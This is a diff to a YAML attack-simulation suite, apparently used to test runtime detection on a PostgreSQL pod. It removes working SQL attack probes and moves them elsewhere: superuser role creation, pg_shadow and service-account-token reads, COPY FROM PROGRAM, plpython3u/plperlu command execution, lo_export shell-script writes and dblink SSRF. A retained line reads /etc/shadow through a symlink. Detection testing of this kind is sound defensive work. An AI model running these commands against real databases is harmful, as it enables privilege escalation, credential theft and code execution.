@@ -72,13 +72,13 @@ attacks:
   # Phase 5: PRIVILEGE ESCALATION (TA0004) — SQL-based priv esc
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1078.004 — Valid Accounts: Create superuser (idempotent for repeatable runs)
-  - name: sql-create-superuser
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_roles WHERE rolname='attacker') THEN CREATE ROLE attacker WITH SUPERUSER LOGIN PASSWORD 'pwned'; END IF; END $$;"]
-    expectedDetections: []
+  # NOTE: Privilege-escalation SQL probes (CREATE ROLE … SUPERUSER, ALTER SYSTEM,
+  # plpython3u/plperlu, lo_export, pg_read_file, COPY FROM PROGRAM, dblink) lived
+  # here previously but were moved to postgres-vuln-attacks.yaml — they require a
+  # superuser connection that the `app` user does not have. Running them under
+  # `-U app` makes the suite report success-via-auth-failure rather than test the
+  # detection. The CLIENT-side suite below stays focused on cmdinject + sensitive
+  # opens that the `app` user CAN exercise via the pg-client pod's shell.
 
   # T1611 — Escape to Host (unshare attempt)
   - name: exec-unshare
@@ -101,14 +101,6 @@ attacks:
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal credentials
   # ═══════════════════════════════════════════════════════════════════════════
-
-  # T1552.001 — Credentials in Files: pg_shadow dump
-  - name: sql-dump-pg-shadow
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT usename, passwd FROM pg_shadow;"]
-    expectedDetections: []
 
   # T1552.001 — Credentials in Files: SA token
   # The SA token mount is not always present in CI k3s. Accept either a non-empty
@@ -152,22 +144,6 @@ attacks:
       command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link && cat /tmp/shadow_link && rm -f /tmp/shadow_link"]
     expectedDetections: []
 
-  # T1552.001 — Read pg_hba.conf via SQL
-  - name: sql-read-pg-hba
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT pg_read_file('/var/lib/postgresql/data/pgdata/pg_hba.conf');"]
-    expectedDetections: []
-
-  # T1552.001 — Read /etc/passwd via SQL
-  - name: sql-read-etc-passwd
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT pg_read_file('/etc/passwd');"]
-    expectedDetections: []
-
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 8: DISCOVERY (TA0007) — Environment enumeration
   # ═══════════════════════════════════════════════════════════════════════════
@@ -200,21 +176,9 @@ attacks:
   # Phase 10: COLLECTION (TA0009) — Data staging
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1005 — Data from Local System: large object import
-  - name: sql-large-object-import
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT lo_import('/etc/hostname');"]
-    expectedDetections: []
-
-  # T1074 — Data Staged: COPY TO file
-  - name: sql-copy-exfil
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "COPY (SELECT * FROM bobtest) TO '/tmp/exfil.csv';"]
-    expectedDetections: []
+  # NOTE: lo_import requires superuser-or-pg_read_server_files; sql-copy-exfil
+  # requires superuser-or-pg_write_server_files for the server-side path. Both
+  # are exercised in postgres-vuln-attacks.yaml under the privileged role.
 
   # ═══════════════════════════════════════════════════════════════════════════
   # Phase 11: EXFILTRATION (TA0010) — DNS exfiltration
@@ -231,13 +195,8 @@ attacks:
   # Phase 12: IMPACT (TA0040) — Data destruction and crypto mining
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # T1485 — Data Destruction: DROP TABLE
-  - name: sql-drop-table
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "DROP TABLE IF EXISTS bobtest_exfil;"]
-    expectedDetections: []
+  # NOTE: sql-drop-table moved to postgres-vuln-attacks.yaml — bobtest_exfil
+  # is created/populated there as part of the destruction kill-chain.
 
   # T1496 — Resource Hijacking: crypto mining DNS signal
   - name: exec-crypto-dns
@@ -251,132 +210,18 @@ attacks:
 
   # ═══════════════════════════════════════════════════════════════════════════
   # CVE-BASED ATTACKS — Historical PostgreSQL vulnerabilities
+  #
+  # NOTE: All CVE probes that require superuser/COPY/PROGRAM/extension privileges
+  # have moved to postgres-vuln-attacks.yaml. They cannot meaningfully execute
+  # under the `app` user that this client-tuning suite uses, and leaving them
+  # here produced false-passes via auth-failure rather than detection signal.
+  # The CVEs covered there:
+  #   - CVE-2019-9193 (COPY FROM/TO PROGRAM RCE)
+  #   - CVE-2018-1058 (search_path hijack, requires plpgsql ownership)
+  #   - CVE-2023-39417 (extension script injection — requires CREATE EXTENSION)
+  #   - CVE-2023-5868 (aggregate function memory leak)
+  #   - sql-plpython3u-rce / sql-plperlu-rce (untrusted languages)
+  #   - sql-lo-export-file-write / sql-dblink-ssrf / sql-alter-system-persist
   # ═══════════════════════════════════════════════════════════════════════════
 
-  # CVE-2019-9193 — COPY FROM PROGRAM command execution
-  # Severity: Critical (CVSS 9.8). Any user with COPY permission can execute
-  # arbitrary OS commands. Not technically a "bug" — it's by design for
-  # superusers, but misconfigured grants make it an RCE vector.
-  # Exploited by TeamTNT and Kinsing crypto miners.
-  - name: cve-2019-9193-copy-program-id
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "CREATE TABLE IF NOT EXISTS cmd_output(line text); COPY cmd_output FROM PROGRAM 'id';"]
-    expectedDetections: []
-
-  # CVE-2019-9193 — COPY FROM PROGRAM whoami
-  - name: cve-2019-9193-copy-program-whoami
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "DROP TABLE IF EXISTS cmd_out2; CREATE TABLE cmd_out2(line text); COPY cmd_out2 FROM PROGRAM 'whoami'; SELECT * FROM cmd_out2;"]
-    expectedDetections: []
-
-  # CVE-2019-9193 — COPY FROM PROGRAM cat /etc/passwd
-  - name: cve-2019-9193-copy-program-passwd
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "DROP TABLE IF EXISTS cmd_out3; CREATE TABLE cmd_out3(line text); COPY cmd_out3 FROM PROGRAM 'cat /etc/passwd'; SELECT * FROM cmd_out3 LIMIT 5;"]
-    expectedDetections: []
-
-  # CVE-2019-9193 — COPY TO PROGRAM (write to pipe)
-  - name: cve-2019-9193-copy-to-program
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "COPY (SELECT 'pwned_via_copy_to_program') TO PROGRAM 'tee /tmp/pg_pwned 2>/dev/null || true';"]
-    expectedDetections: []
-
-  # T1059 — PL/Python untrusted language (RCE via CREATE FUNCTION)
-  # Used by attackers who gain superuser to execute Python code in-process.
-  - name: sql-plpython3u-rce
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "CREATE EXTENSION IF NOT EXISTS plpython3u; CREATE OR REPLACE FUNCTION exec_cmd(cmd text) RETURNS text AS $$ import subprocess; return subprocess.check_output(cmd, shell=True).decode() $$ LANGUAGE plpython3u; SELECT exec_cmd('id');"]
-    expectedDetections: []
-
-  # T1059 — PL/Perl untrusted language (alternative RCE path)
-  - name: sql-plperlu-rce
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "CREATE EXTENSION IF NOT EXISTS plperlu; CREATE OR REPLACE FUNCTION perl_exec(cmd text) RETURNS text AS $$ my $output = `$_[0]`; return $output; $$ LANGUAGE plperlu; SELECT perl_exec('whoami');"]
-    expectedDetections: []
-
-  # CVE-2018-1058 — Schema search_path hijacking
-  # Severity: High (CVSS 8.8). Unprivileged user creates function in public
-  # schema that shadows a system function, executed by superuser later.
-  - name: cve-2018-1058-search-path-hijack
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "CREATE OR REPLACE FUNCTION public.upper(text) RETURNS text AS $$ SELECT 'CVE-2018-1058:hijacked:' || $1; $$ LANGUAGE SQL; SELECT upper('test');"]
-    expectedDetections: []
-
-  # T1190 — lo_export: write arbitrary file via large object
-  # Classic postgres trick: import file as large object, then export elsewhere.
-  # Capture the OID returned by lo_from_bytea and pass it to lo_export; lo_unlink
-  # afterwards so we don't accumulate orphaned large objects across runs.
-  - name: sql-lo-export-file-write
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "DO $$ DECLARE oid_ oid; BEGIN oid_ := lo_from_bytea(0, E'#!/bin/sh\\nid > /tmp/pg_rce_proof\\n'); PERFORM lo_export(oid_, '/tmp/pg_payload.sh'); PERFORM lo_unlink(oid_); END $$; SELECT 'lo_export_done';"]
-    expectedDetections: []
-
-  # T1190 — dblink SSRF (connect to internal services from DB)
-  # Used to pivot from compromised DB to internal network services.
-  - name: sql-dblink-ssrf
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "CREATE EXTENSION IF NOT EXISTS dblink; SELECT dblink_connect('host=kubernetes.default.svc port=443 dbname=postgres connect_timeout=2');"]
-    expectedDetections: []
-
-  # T1505 — ALTER SYSTEM persistence (write to postgresql.auto.conf)
-  # Attacker can persist config changes that survive restarts. We immediately
-  # RESET so postgresql.auto.conf doesn't accumulate state across CI runs.
-  - name: sql-alter-system-persist
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "ALTER SYSTEM SET log_connections = off; ALTER SYSTEM RESET log_connections; SELECT pg_reload_conf();"]
-    expectedDetections: []
-
-  # T1552.001 — pg_read_file: read /etc/hostname
-  - name: sql-pg-read-file-hostname
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT pg_read_file('/etc/hostname');"]
-    expectedDetections: []
-
-  # T1552.001 — pg_read_file: read SA token
-  - name: sql-pg-read-file-sa-token
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/token');"]
-    expectedDetections: []
-
-  # CVE-2023-5868 — Aggregate function memory disclosure
-  # Severity: Medium (CVSS 4.3). Information leak via DISTINCT aggregates.
-  - name: cve-2023-5868-aggregate-leak
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "SELECT array_agg(DISTINCT x ORDER BY x) FROM generate_series(1,1000) AS x;"]
-    expectedDetections: []
-
-  # CVE-2023-39417 — Extension script injection
-  # Severity: High (CVSS 8.8). SQL injection via CREATE EXTENSION with
-  # crafted @extowner or @extschema.
-  - name: cve-2023-39417-extension-inject
-    type: sqli
-    exec:
-      command: ["psql", "-h", "pg-rw", "-U", "app", "-d", "app", "-tAc",
-                "CREATE EXTENSION IF NOT EXISTS pg_stat_statements;"]
-    expectedDetections: []
+  # (no probes here — see note above)
